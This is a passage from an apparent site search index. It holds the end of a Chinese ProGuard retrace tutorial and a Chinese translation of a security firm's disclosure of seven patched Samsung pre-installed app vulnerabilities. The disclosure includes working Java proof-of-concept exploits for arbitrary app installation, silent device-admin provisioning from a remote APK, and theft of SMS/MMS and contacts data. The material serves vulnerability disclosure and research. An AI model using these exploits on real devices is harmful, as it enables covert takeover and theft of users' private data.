2.\u5982\u679c\u4f60\u4f7f\u7528\u4e86\u7b2c\u4e09\u65b9\u7684\u5305\uff0c\u4f60\u9700\u8981\u4f7f\u7528\u4e00\u4e0b\u914d\u7f6e\uff0c\u8ba9ProGuard\u77e5\u9053\u5e93\u4e2d\u7684\u4e00\u4e9b\u7c7b\u5e76\u4e0d\u662f\u5728\u6240\u6709\u7684API\u4e2d\u53ef\u7528\uff1a -libraryjars libs/roboguice-2.0.jar -dontwarnroboguice.** 3.\u5728\u6253\u5305\u7684\u8fc7\u7a0b\u4e2d\uff0c\u51fa\u73b0\u5982\u4e0b\u9519\u8bef\uff1a Proguardreturned with error code 1. See console [2012-09-25 09:50:39 - estore3601] Error: @C:\\Users\\hp\\AppData\\Local\\Temp\\android_5192919586673521494.pro (\u6587\u4ef6\u540d\u3001\u76ee\u5f55\u540d\u6216\u5377\u6807\u8bed\u6cd5\u4e0d\u6b63\u786e\u3002) \u4f60\u9700\u8981\u7cfb\u5728ProGuard\u6700\u65b0\u7248\u672c\uff0c\u5982v4.8\u3002\u7136\u540e\u89e3\u538bproduard4.8.zip\u6587\u4ef6\uff0c\u5c06bin\u548clib\u4e24\u4e2a\u6587\u4ef6\u5939\u8986\u76d6sdk\u76ee\u5f55\\tool\\proguard\u76ee\u5f55\u4e2d\u540c\u540d\u7684\u6587\u4ef6\u5939\u3002","title":"\u56db\u3001\u53ef\u80fd\u51fa\u73b0\u7684\u95ee\u9898"},{"location":"Android/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF%EF%BC%9AProguard%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%B4%A9%E6%BA%83%E6%97%A5%E5%BF%97%E5%8F%8D%E6%B7%B7%E6%B7%86/#_4","text":"\u5728\u5b9e\u9645\u5de5\u4f5c\u4e2d\uff0c\u6211\u4eec\u4f1a\u4f7f\u7528\u4e00\u4e0b\u5f00\u6e90\u7684\u7cfb\u7edf\uff08\u5982ACRA\uff09\u76d1\u63a7\u548c\u6536\u96c6\u5d29\u6e83\u65e5\u5fd7\uff0c\u4f46\u662f\u7531\u4e8e\u6b63\u5f0f\u7248\u672c\u7684\u53d1\u5e03\u4e3a\u4e86\u9632\u6b62\u53cd\u7f16\u8bd1\u7b49\u65b9\u9762\u7684\u8003\u8651\uff0c\u4f1a\u4f7f\u7528ProGuard\u7684\u65b9\u5f0f\u4ee3\u7801\u6df7\u6dc6\u3002\u6536\u96c6\u4e0a\u6765\u7684\u65e5\u5fd7\u5982\u4e0b\u7684\u6df7\u6dc6\uff0cat com.example.atom.hotel.a.c.f.a(SourceFile:66)\uff0c\u4e0d\u5229\u4e8e\u95ee\u9898\u7684\u5206\u6790\u3002 java.lang.IndexOutOfBoundsException: Invalid index 0, size is 0 at java.util.ArrayList.throwIndexOutOfBoundsException(ArrayList.java:255) at java.util.ArrayList.get(ArrayList.java:308) at com.example.atom.hotel.a.c.f.a(SourceFile:66) at com.example.atom.hotel.a.c.f.<init>(SourceFile:60) \u5176\u5b9e\uff0c\u6211\u4eec\u65e2\u7136\u53ef\u4ee5\u9002\u5e94ProGuad\u8fdb\u884c\u6df7\u6dc6\uff0c\u90a3\u4e48\u5e94\u8be5\u53ef\u4ee5\u60f3\u5230\u53ef\u4ee5\u53cd\u6df7\u6dc6\u56de\u6765\u3002\u518d\u4f7f\u7528ProGuard\u6df7\u6dc6\u4ee3\u7801\u6253\u5305\u7684\u65f6\u5019\uff0c\u4f1a\u751f\u751f\u4e00\u4e2amapping.txt\u6587\u4ef6\u3002\u8fd9\u4e2a\u6587\u4ef6\u8bb0\u5f55\u4e86\u6df7\u6dc6\u524d\u540e\u7684\u7c7b\u3001\u65b9\u6cd5\u7b49\u6620\u5c04\u5173\u7cfb\u3002\u901a\u8fc7{sdk-dir}\\tools\\proguard\\bin\u76ee\u5f55\u4e0b\u7684retrace.bat\u5de5\u5177\u53cd\u6df7\u6dc6\uff0c\u6267\u884c\u547d\u4ee4\uff1aretract.bat -verbose mapping.txt obfuscated_tract.txt > out_tract.txt\u3002\u7ed3\u679c\u8f93\u51fa\u5982\u4e0b\uff1a java.lang.IndexOutOfBoundsException: Invalid index 0, size is 0 at java.util.ArrayList.throwIndexOutOfBoundsException(ArrayList.java:255) at java.util.ArrayList.get(ArrayList.java:308) at com.example.atom.hotel.delegate.HotelListDelegateAdapter.void initSpecialPreferentialTips(boolean)(SourceFile:66) at com.example.atom.hotel.delegate.HotelListDelegateAdapter.<init>(SourceFile:60) \u65b0\u6280\u672f\uff0c\u65b0\u672a\u6765\uff01\u6b22\u8fce\u5927\u5bb6\u5173\u6ce8 \u201c1024\u5de5\u573a\u201d\u5fae\u4fe1\u670d\u52a1\u53f7 \uff0c\u65f6\u523b\u5173\u6ce8\u6211\u4eec\u7684\u6700\u65b0\u7684\u6280\u672f\u8baf\u606f\uff01 \uff08\u752d\u5ba2\u6c14\uff01\u5c3d\u60c5\u7684\u626b\u63cf\u6216\u8005\u957f\u6309\uff01\uff09 \ufeff\ufeff \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/p106786860/article/details/11974863","title":"\u4e94\u3001\u53cd\u6df7\u6dc6\u5d29\u6e83\u65e5\u5fd7"},{"location":"Android/%E9%BB%91%E5%AE%A2%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E4%B8%89%E6%98%9F%E9%A2%84%E8%A3%85%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E6%9D%A5%E7%9B%91%E8%A7%86%E7%94%A8%E6%88%B7/","text":"\u9ed1\u5ba2\u53ef\u4ee5\u5229\u7528\u4e09\u661f\u9884\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u6765\u76d1\u89c6\u7528\u6237 \u4e09\u661f\u9884\u88c5\u7684 Android \u5e94\u7528\u7a0b\u5e8f\u4e2d\u62ab\u9732\u4e86\u591a\u4e2a\u4e25\u91cd\u7684\u5b89\u5168\u6f0f\u6d1e\uff0c\u5982\u679c\u6210\u529f\u5229\u7528\u8fd9\u4e9b\u6f0f\u6d1e\uff0c \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u672a\u7ecf\u7528\u6237\u540c\u610f\u7684\u60c5\u51b5\u4e0b\u8bbf\u95ee\u4e2a\u4eba\u6570\u636e\u5e76\u63a7\u5236\u8bbe\u5907\u3002 \u201c\u8fd9\u4e9b\u6f0f\u6d1e\u7684\u5f71\u54cd\u53ef\u80fd\u5141\u8bb8\u653b\u51fb\u8005\u8bbf\u95ee\u548c\u7f16\u8f91\u53d7\u5bb3\u8005\u7684\u8054\u7cfb\u4eba\u3001\u7535\u8bdd\u3001\u77ed\u4fe1/\u5f69\u4fe1\uff0c\u5b89\u88c5\u5177\u6709\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650\u7684\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\uff0c\u6216\u4ee3\u8868\u7cfb\u7edf\u7528\u6237\u8bfb\u5199\u4efb\u610f\u6587\u4ef6\uff0c\u8fd9\u53ef\u80fd\u4f1a\u66f4\u6539\u8bbe\u5907\u7684\u8bbe\u7f6e\uff0c\u201d\u79fb\u52a8\u5b89\u5168\u521d\u521b\u516c\u53f8 Oversecured \u7684\u521b\u59cb\u4eba Sergey Toshin\u5728\u5468\u56db\u53d1\u5e03\u7684\u4e00\u4efd\u5206\u6790\u62a5\u544a\u4e2d \u8868\u793a \u3002 Toshin \u4e8e 2021 \u5e74 2 \u6708\u5411\u4e09\u661f\u62a5\u544a\u4e86\u8fd9\u4e9b\u7f3a\u9677\uff0c\u968f\u540e\u5236\u9020\u5546 \u53d1\u5e03 \u4e86 \u8865\u4e01\uff0c \u4f5c\u4e3a\u5176 4 \u6708\u548c 5 \u6708\u7684\u6708\u5ea6\u5b89\u5168\u66f4\u65b0\u7684\u4e00\u90e8\u5206\u3002 \u4e03\u4e2a\u6f0f\u6d1e\u5217\u8868\u5982\u4e0b: CVE-2021-25356 \u2013 \u6258\u7ba1\u4f9b\u5e94\u4e2d\u7684\u7b2c\u4e09\u65b9\u8eab\u4efd\u9a8c\u8bc1\u7ed5\u8fc7 CVE-2021-25388 \u2013 Knox Core \u4e2d\u7684\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\u5b89\u88c5\u6f0f\u6d1e CVE-2021-25390 \u2013 PhotoTable \u4e2d\u7684 \u610f\u56fe\u91cd\u5b9a\u5411 CVE-2021-25391 \u2013 \u5b89\u5168\u6587\u4ef6\u5939\u4e2d\u7684\u610f\u56fe\u91cd\u5b9a\u5411 CVE-2021-25392 \u2013 \u53ef\u4ee5\u8bbf\u95ee DeX \u7684 \u901a\u77e5\u7b56\u7565\u6587\u4ef6 CVE-2021-25393 \u2013 \u53ef\u4ee5\u4f5c\u4e3a\u7cfb\u7edf\u7528\u6237\u5bf9\u4efb\u610f\u6587\u4ef6\u8fdb\u884c\u8bfb/\u5199\u8bbf\u95ee\uff08\u5f71\u54cd\u8bbe\u7f6e\u5e94\u7528\u7a0b\u5e8f\uff09 CVE-2021-25397 \u2013 TelephonyUI \u4e2d\u7684 \u4efb\u610f\u6587\u4ef6\u5199\u5165 \u8fd9\u4e9b\u6f0f\u6d1e\u7684\u5f71\u54cd\u610f\u5473\u7740\u5b83\u4eec\u53ef\u80fd\u88ab\u5229\u7528\u6765\u5b89\u88c5\u4efb\u610f\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u3001\u6388\u4e88\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650\u4ee5\u5220\u9664\u5176\u4ed6\u5df2\u5b89\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\u6216\u7a83\u53d6\u654f\u611f\u6587\u4ef6\u3001\u4ee5\u7cfb\u7edf\u7528\u6237\u8eab\u4efd\u8bfb\u53d6\u6216\u5199\u5165\u4efb\u610f\u6587\u4ef6\uff0c\u751a\u81f3\u6267\u884c\u7279\u6743\u64cd\u4f5c\u3002 \u5728\u6982\u5ff5\u9a8c\u8bc1 (PoC) \u6f14\u793a\u4e2d\uff0cOversecured \u786e\u5b9a\u53ef\u4ee5\u5229\u7528 PhotoTable \u548c Secure Folder \u4e2d\u7684\u610f\u56fe\u91cd\u5b9a\u5411\u7f3a\u9677\u6765\u52ab\u6301\u5e94\u7528\u7a0b\u5e8f\u8bbf\u95ee SD \u5361\u548c\u8bfb\u53d6\u5b58\u50a8\u5728\u624b\u673a\u4e2d\u7684\u8054\u7cfb\u4eba\u7684\u6743\u9650\u3002\u540c\u6837\uff0c\u901a\u8fc7\u5229\u7528 CVE-2021-25397 \u548c CVE-2021-25392\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u7528\u6076\u610f\u5185\u5bb9\u8986\u76d6\u5b58\u50a8 SMS/MMS \u6d88\u606f\u7684\u6587\u4ef6\uff0c\u5e76\u4ece\u7528\u6237\u901a\u77e5\u4e2d\u7a83\u53d6\u6570\u636e\u3002 \u5efa\u8bae\u4e09\u661f\u8bbe\u5907\u6240\u6709\u8005\u5e94\u7528\u8be5\u516c\u53f8\u7684\u6700\u65b0\u56fa\u4ef6\u66f4\u65b0\uff0c\u4ee5\u907f\u514d\u4efb\u4f55\u6f5c\u5728\u7684\u5b89\u5168\u98ce\u9669\u3002 \u6f0f\u6d1e\u8be6\u60c5 \u8fd9\u4e9b \u6f0f\u6d1e\u53ef\u80fd\u5bfc\u81f4\u8fdd\u53cd GDPR \uff0c\u6211\u4eec\u5f88\u9ad8\u5174\u80fd\u591f\u5e2e\u52a9\u4e09\u661f\u53ca\u65f6\u8bc6\u522b\u548c\u4fee\u590d\u8fd9\u4e9b\u6f0f\u6d1e\u3002 \u5982\u679c\u60a8\u662f\u5f00\u53d1\u4eba\u5458\u6216\u5e94\u7528\u7a0b\u5e8f\u6240\u6709\u8005\uff0c\u60a8\u53ef\u4ee5\u5c06 Oversecured \u96c6\u6210\u5230\u60a8\u7684 CI/CD \u4e2d\uff0c\u4ee5\u4e3b\u52a8\u4fdd\u62a4\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u514d\u53d7\u8fd9\u4e9b\u6f0f\u6d1e\u7684\u4fb5\u5bb3\u3002 CI/CD \u8fc7\u7a0b\u4e5f\u53ef\u4ee5\u4f7f\u7528\u63d2\u4ef6\u5b8c\u5168\u81ea\u52a8\u5316\u3002\u6211\u4eec\u7684\u89e3\u51b3\u65b9\u6848\u5c06\u6301\u7eed\u76d1\u63a7\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5e76\u5728\u68c0\u6d4b\u5230\u4efb\u4f55\u65b0\u6f0f\u6d1e\u65f6\u63d0\u9192\u60a8\u3002 \u4ece Quick Start \u5f00\u59cb\u8bd5\u7528\uff0c\u5f00\u59cb\u4fdd\u62a4\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u6216\u8005\u60a8\u53ef\u4ee5 \u5728\u6b64\u5904 \u8054\u7cfb\u6211\u4eec\u4ee5\u4e86\u89e3\u66f4\u591a\u4fe1\u606f\u5e76\u83b7\u53d6\u6f14\u793a\u3002 \u5982\u679c\u60a8\u662f\u4e00\u540d\u5b89\u5168\u7814\u7a76\u4eba\u5458\uff0c\u60a8\u53ef\u4ee5\u4f7f\u7528 Oversecured \u7684\u79fb\u52a8\u5e94\u7528\u7a0b\u5e8f\u626b\u63cf\u5668\u626b\u63cf\u8fd9\u4e9b\u9519\u8bef\uff0c\u4ece\u800c\u81ea\u52a8\u6267\u884c\u9519\u8bef\u68c0\u6d4b\u8fc7\u7a0b\u3002\u60a8\u6240\u8981\u505a\u7684\u5c31\u662f \u6ce8\u518c \u5e76\u4e0a\u4f20\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u6587\u4ef6\u3002\u6211\u4eec\u7684\u626b\u63cf\u4eea\u5c06\u8d1f\u8d23\u5176\u4f59\u7684\u5de5\u4f5c\u3002 \u6f0f\u6d1e\u8be6\u60c5\u5217\u8868\uff1a CVE SVE \u53d7\u5f71\u54cd\u7684\u5e94\u7528 \u63cf\u8ff0 \u5956\u52b1\u91d1\u989d CVE-2021-25388 SVE-2021-20636 Knox Core (com.samsung.android.knox.containercore) \u5b89\u88c5\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\u548c\u8bbe\u5907\u8303\u56f4\u5185\u7684\u4efb\u610f\u6587\u4ef6\u76d7\u7a83 1720 \u7f8e\u5143 CVE-2021-25356 SVE-2021-20733 \u6258\u7ba1\u914d\u7f6e (com.android.managedprovisioning) \u5b89\u88c5\u7b2c\u4e09\u65b9\u5e94\u7528\u7a0b\u5e8f\u5e76\u6388\u4e88\u4ed6\u4eec\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650 7000 \u7f8e\u5143 CVE-2021-25391 SVE-2021-20500 \u5b89\u5168\u6587\u4ef6\u5939 (com.samsung.knox.securefolder) \u8bbf\u95ee\u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u5546 1050 \u7f8e\u5143 CVE-2021-25393 SVE-2021-20731 SecSettings (com.android.settings) \u83b7\u5f97\u5bf9\u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u8005\u7684\u8bbf\u95ee\u6743\u9650\u5bfc\u81f4\u4ee5\u7cfb\u7edf\u7528\u6237\u8eab\u4efd\uff08UID 1000\uff09\u5bf9\u4efb\u610f\u6587\u4ef6\u8fdb\u884c\u8bfb/\u5199\u8bbf\u95ee 5460 \u7f8e\u5143 CVE-2021-25392 SVE-2021-20690 \u4e09\u661f DeX \u7cfb\u7edf UI (com.samsung.desktopsystemui) \u80fd\u591f\u7a83\u53d6\u901a\u77e5\u7b56\u7565\u914d\u7f6e 330 \u7f8e\u5143 CVE-2021-25397 SVE-2021-20716 TelephonyUI (com.samsung.android.app.telephonyui) \uff08\u8986\u76d6\uff09\u5c06\u4efb\u610f\u6587\u4ef6\u5199\u5165\u4e3a UID 1001 4850 \u7f8e\u5143 CVE-2021-25390 SVE-2021-20724 PhotoTable (com.android.dreams.phototable) \u610f\u56fe\u91cd\u5b9a\u5411\u5bfc\u81f4\u8bbf\u95ee\u4efb\u610f\u5185\u5bb9\u63d0\u4f9b\u8005 280 \u7f8e\u5143 Knox Core \u4e2d\u7684\u6f0f\u6d1e \u9996\u5148\uff0c\u6211\u4eec\u626b\u63cf\u4e86 Knox Core \u5e94\u7528\u7a0b\u5e8f\uff0c\u53d1\u73b0\u4ece SD \u5361\u5b89\u88c5\u4e86\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff1a \u4e8b\u5b9e\u8bc1\u660e\uff0c\u6b64\u529f\u80fd\u662f\u901a\u8fc7\u5bfc\u51fa\u7684\u670d\u52a1\u6fc0\u6d3b\u7684 com.samsung.android.knox.containercore.provisioning.DualDARInitService \uff1a <service android:name=\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\" android:exported=\"true\"> <intent-filter> <action android:name=\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"/> </intent-filter> </service> \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7 dualdar-config-client-location \u53c2\u6570\u4f20\u9012\u4efb\u610f URI\uff0c\u8be5\u53c2\u6570\u5c06\u88ab\u590d\u5236\u5230 /sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk \uff0c\u8fd9\u662f\u4e00\u4e2a\u4e16\u754c\u53ef\u8bfb\u7684\u4f4d\u7f6e\u3002 \u4e4b\u540e\uff0c\u5c06\u542f\u52a8\u5e94\u7528\u7a0b\u5e8f\u5b89\u88c5\u8fc7\u7a0b\uff1a private void proceedPrerequisiteForDualDARWithWPCOD(Intent intent) { if (intent.getBooleanExtra(\"DUAL_DAR_IS_WPCOD\", false)) { int intExtra = intent.getIntExtra(\"android.intent.extra.user_handle\", UserHandle.myUserId()); Bundle bundleExtra = intent.getBundleExtra(\"DUAL_DAR_PARAMS\"); String string = bundleExtra.getString(\"dualdar-config-client-package\", null); if (!TextUtils.isEmpty(string)) { DDLog.m4d(\"KNOXCORE::DualDARInitService\", \"Start proceedPrerequisiteForDualDARWithWPCOD 3rd-party crypto\"); String string2 = bundleExtra.getString(\"dualdar-config-client-location\"); // attacker-controlled URI DDLog.m4d(\"KNOXCORE::DualDARInitService\", \"DualDARPolicy.KEY_CONFIG_CLIENT_LOCATION = \" + string2); if (TextUtils.isEmpty(string2)) { notifyMPError(5); } else if (string2.startsWith(\"file://\")) { String str = getExternalFilesDir(null) + \"/client_downloaded_knox_app.apk\"; try { // attacker-controlled file is copied to the public location ((SemRemoteContentManager) this.mContext.getSystemService(\"rcp\")).copyFile(intExtra, string2.replaceFirst(\"^file://\", \"\"), intExtra, str); installPackageTask(intent, string, str); // and then installed } catch (RemoteException unused) { DDLog.m3e(\"KNOXCORE::DualDARInitService\", \"copyFile failed.\"); notifyMPError(5); } } else if (string2.startsWith(\"https://\")) { downloadPackageTask(intent, string, string2); } else { notifyMPError(5); } } else { DDLog.m4d(\"KNOXCORE::DualDARInitService\", \"Start proceedPrerequisiteForDualDARWithWPCOD native crypto\"); startRunnerTask(intent); } } } \u5b89\u88c5\u4efb\u610f\u5e94\u7528\u7a0b\u5e8f\u7684\u6982\u5ff5\u8bc1\u660e protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); try { Bundle bundle = new Bundle(); bundle.putString(\"dualdar-config-client-package\", \"test.exampleapp\"); bundle.putString(\"dualdar-config-client-location\", Uri.fromFile(copyFile()).toString()); Intent i = new Intent(\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"); i.setClassName(\"com.samsung.android.knox.containercore\", \"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"); i.putExtra(\"DualDARServiceEventFlag\", 500); i.putExtra(\"DUAL_DAR_IS_WPCOD\", true); i.putExtra(\"DUAL_DAR_PARAMS\", bundle); startService(i); } catch (Throwable th) { throw new RuntimeException(th); } } private File copyFile() throws Throwable { File file = new File(getApplicationInfo().dataDir, \"app.apk\"); InputStream i = getAssets().open(\"app-release.apk\"); OutputStream o = new FileOutputStream(file); IOUtils.copy(i, o); i.close(); o.close(); return file; } SMS/MMS \u6587\u4ef6\u76d7\u7a83\u7684\u6982\u5ff5\u8bc1\u660e protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); startDump(); try { File dbPath = new File(getPackageManager().getApplicationInfo(\"com.android.providers.telephony\", 0).dataDir, \"databases/mmssms.db\"); Bundle bundle = new Bundle(); bundle.putString(\"dualdar-config-client-package\", \"test.exampleapp\"); bundle.putString(\"dualdar-config-client-location\", Uri.fromFile(dbPath).toString()); Intent i = new Intent(\"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"); i.setClassName(\"com.samsung.android.knox.containercore\", \"com.samsung.android.knox.containercore.provisioning.DualDARInitService\"); i.putExtra(\"DualDARServiceEventFlag\", 500); i.putExtra(\"DUAL_DAR_IS_WPCOD\", true); i.putExtra(\"DUAL_DAR_PARAMS\", bundle); new Thread(() -> { for(int j = 1; j < 1000; j++) { startService(i); try { Thread.sleep(500); } catch (Throwable th) { throw new RuntimeException(th); } } }).start(); } catch (Throwable th) { throw new RuntimeException(th); } } private void startDump() { final String path = \"/sdcard/Android/data/com.samsung.android.knox.containercore/files/client_downloaded_knox_app.apk\"; ContentValues values = new ContentValues(); values.put(\"_data\", path); Uri uri = getContentResolver().insert(MediaStore.Files.getContentUri(\"external\"), values); new Thread(new Runnable() { public void run() { while (true) { try { InputStream i = getContentResolver().openInputStream(uri); String data = IOUtils.toString(i); Log.d(\"evil\", data); i.close(); } catch (Throwable th) { } } } }).start(); } PoC \u7684\u5de5\u4f5c\u539f\u7406\u5982\u4e0b\uff1a \u542f\u52a8\u670d\u52a1\u5c06\u6240\u9700\u6587\u4ef6\u590d\u5236\u5230\u516c\u5171\u4f4d\u7f6e\uff08\u7531\u4e8e\u8fd9\u662f\u4e00\u4e2a\u65e0\u6548\u7684APK\u6587\u4ef6\uff0c\u5b89\u88c5\u9519\u8bef\u540e\u4f1a\u7acb\u5373\u5220\u9664\uff09\uff0c \u7136\u540e\uff0c client_downloaded_knox_app.apk \u8bfb\u53d6\u6587\u4ef6\u3002 \u6ce8\u610f\uff1a \u6211\u4eec\u4f7f\u7528 MediaStore.Files \u662f\u56e0\u4e3a\u6700\u65b0\u7684 Android \u7248\u672c\u4e0d\u5141\u8bb8\u76f4\u63a5\u8bfb\u53d6\u5c5e\u4e8e\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u7684\u5916\u90e8\u5b58\u50a8\uff0c\u4f46\u8fd9\u53ef\u4ee5\u4f7f\u7528 Android Media Content Provider \u7ed5\u8fc7\u3002 \u6258\u7ba1\u4f9b\u5e94\u4e2d\u7684\u6f0f\u6d1e Managed Provisioning \u662f\u6240\u6709\u4e09\u661f\u8bbe\u5907\u4e0a\u9884\u88c5\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c \u7528\u4e8e\u4f01\u4e1a\u8bbe\u5907\u5b9a\u5236 \u3002 \u518d\u4e00\u6b21\uff0c\u5728\u6d4b\u8bd5 Managed Provisioning \u65f6\uff0c\u6211\u4eec\u53d1\u73b0\u4e86\u4ece\u516c\u5171\u76ee\u5f55\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f\u7684\u6f0f\u6d1e\uff1a \u6700\u521d\u7684\u5e94\u7528\u7a0b\u5e8f\u662f\u7531 AOSP \u5f00\u53d1\u7684\uff0c\u5b83\u6709\u5b89\u5168\u68c0\u67e5\u6765\u9a8c\u8bc1\u4efb\u4f55\u4ea4\u4e92\u7684\u6388\u6743\u3002\u4e09\u661f\u4fee\u6539\u4e86\u6258\u7ba1\u914d\u7f6e\u5e94\u7528\u7a0b\u5e8f\uff0c\u4ee5\u6dfb\u52a0\u4e0e\u5176\u751f\u6001\u7cfb\u7edf\u548c Knox Core \u4ea4\u4e92\u6240\u9700\u7684\u529f\u80fd\u3002 \u56e0\u6b64\uff0c\u5728\u4e09\u661f\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u503c\u6765\u7ed5\u8fc7\u6b64\u68c0\u67e5 com.samsung.knox.container.requestId \uff1a int intExtra = intent.getIntExtra(\"com.samsung.knox.container.requestId\", -1); if (intExtra > 0) { ProvisionLogger.logw(\"Skipping verifyActionAndCaller\"); // the bypass } else if (!verifyActionAndCaller(intent, str)) { return; } \u7528\u4e8e\u5b89\u88c5\u81ea\u5b9a\u4e49\u5e94\u7528\u7a0b\u5e8f\u5e76\u4e3a\u5176\u6388\u4e88\u8bbe\u5907\u7ba1\u7406\u5458\u6743\u9650\u7684\u6982\u5ff5\u8bc1\u660e \u8fd9\u4e2a\u6982\u5ff5\u8bc1\u660e\u662f\u901a\u8fc7\u590d\u5236 ProvisioningParams.Builder \u7c7b\u7684\u4ee3\u7801\u5e76\u4f20\u9012\u914d\u7f6e\u6258\u7ba1\u4f9b\u5e94\u6240\u9700\u7684\u6807\u51c6\u53c2\u6570\u6765\u6784\u5efa\u7684\uff0c\u5176\u4e2d\u5305\u62ec\uff1a \u4e0b\u8f7d\u5e94\u7528\u7a0b\u5e8f\u7684 URL \u6587\u4ef6\u7684 SHA1 \u54c8\u5e0c\u503c \u5728 \u8bbe\u5907\u7ba1\u7406\u63a5\u6536\u673a \u7ec4\u4ef6\u540d\u79f0 byte[] hash = Base64.decode(\"5VNuCGDQygiVg4S86BKhySBVJlOpDZs3YYYsJKIOtCQ\", 0); PackageDownloadInfo.Builder infoBuiler = PackageDownloadInfo.Builder.builder() .setLocation(\"https://redacted.s3.amazonaws.com/app-release.apk\") .setPackageChecksum(hash) .setSignatureChecksum(hash); ProvisioningParams.Builder builder = ProvisioningParams.Builder.builder() .setSkipUserConsent(true) .setDeviceAdminComponentName(new ComponentName(\"test.exampleapp\", \"test.exampleapp.MyReceiver\")) .setDeviceAdminPackageName(\"test.exampleapp\") .setProvisioningAction(\"android.app.action.PROVISION_MANAGED_DEVICE\") .setDeviceAdminDownloadInfo(infoBuiler.build()); ProvisioningParams params = builder.build(); Intent i = new Intent(\"com.android.managedprovisioning.action.RESUME_PROVISIONING\"); i.setClassName(\"com.android.managedprovisioning\", \"com.android.managedprovisioning.preprovisioning.PreProvisioningActivity\"); i.putExtra(\"provisioningParams\", params); i.putExtra(\"com.samsung.knox.container.requestId\", 1); i.putExtra(\"com.samsung.knox.container.configType\", \"knox-do-basic\"); startActivity(i); \u6253\u5f00\u5e94\u7528\u7a0b\u5e8f\u540e\uff0c\u53d1\u751f\u4e86\u4ee5\u4e0b\u60c5\u51b5\uff1a Managed Provisioning \u88ab\u8feb\u4ece\u653b\u51fb\u8005\u6307\u5b9a\u7684\u94fe\u63a5\u4e0b\u8f7d\u6076\u610f\u5e94\u7528\u7a0b\u5e8f \u6b65\u9aa4 1 \u4e2d\u5b89\u88c5\u7684\u6076\u610f\u5e94\u7528\u7a0b\u5e8f\u88ab\u8bbe\u7f6e\u4e3a\u5177\u6709\u4efb\u610f\u6743\u9650\u7684\u8bbe\u5907\u7ba1\u7406\u5458 \u542f\u52a8\u4e86\u4e00\u4e2a\u8fc7\u7a0b\uff0c\u8be5\u8fc7\u7a0b\u5c06\u5220\u9664\u5b89\u88c5\u5728\u540c\u4e00\u8bbe\u5907\u4e0a\u7684\u6240\u6709\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\u3002 \u653b\u51fb\u770b\u8d77\u6765\u662f\u8fd9\u6837\u7684\uff1a \u5b89\u5168\u6587\u4ef6\u5939\u4e2d\u7684\u6f0f\u6d1e \u5b89\u5168\u6587\u4ef6\u5939\u662f\u9884\u88c5\u5728\u4e09\u661f\u8bbe\u5907\u4e0a\u7684\u5b89\u5168\u6587\u4ef6\u5b58\u50a8\u5e94\u7528\u7a0b\u5e8f\u3002\u5b83\u62e5\u6709\u5927\u91cf\u6743\u9650\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5229\u7528\u5728\u8bbf\u95ee \u4efb\u610f*\u5185\u5bb9\u63d0\u4f9b\u7a0b\u5e8f\u4e2d \u53d1\u73b0\u7684\u6f0f\u6d1e\u6765\u62e6\u622a\u8fd9\u4e9b\u6743\u9650\uff1a \u4e00\u65e6\u653b\u51fb\u8005\u6536\u5230\u4ed6\u4eec\u53d1\u9001\u7684\u610f\u56fe\uff0c\u4ed6\u4eec\u5c31\u80fd\u591f\u62e6\u622a\u6743\u9650\u3002 \u4f5c\u4e3a PoC\uff0c\u6211\u4eec\u62e6\u622a\u4e86\u8bfb/\u5199\u8054\u7cfb\u4eba\u7684\u6743\u9650\uff1a protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); Intent i = new Intent(); i.setClassName(\"com.samsung.knox.securefolder\", \"com.samsung.knox.securefolder.containeragent.ui.settings.KnoxSettingCheckLockTypeActivity\"); i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION); i.setData(ContactsContract.RawContacts.CONTENT_URI); startActivityForResult(i, 0); } protected void onActivityResult(int requestCode, int resultCode, Intent data) { super.onActivityResult(requestCode, resultCode, data); dump(data.getData()); } private void dump(Uri uri) { Cursor cursor = getContentResolver().query(uri, null, null, null, null); if (cursor.moveToFirst()) { do { StringBuilder sb = new StringBuilder(); for (int i = 0; i < cursor.getColumnCount(); i++) { if (sb.length() > 0) { sb.append(\", \"); } sb.append(cursor.getColumnName(i) + \" = \" + cursor.getString(i)); } Log.d(\"evil\", sb.toString()); } while (cursor.moveToNext()); } } SecSettings 